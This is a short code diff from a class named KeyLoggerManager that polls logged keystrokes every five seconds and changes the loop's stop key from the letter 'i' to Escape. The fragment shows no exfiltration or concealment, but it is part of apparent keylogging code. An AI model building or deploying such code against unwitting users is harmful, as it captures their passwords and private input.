@@ -15,7 +15,7 @@ class KeyLoggerManager:
         end = False
         while not end:
             self.buffer = service.get_logged_keys()
-            if "i" in self.buffer:
+            if "<ESC>" in self.buffer:
                 end = True
             time.sleep(5)
         timestamp = str(datetime.datetime.now())
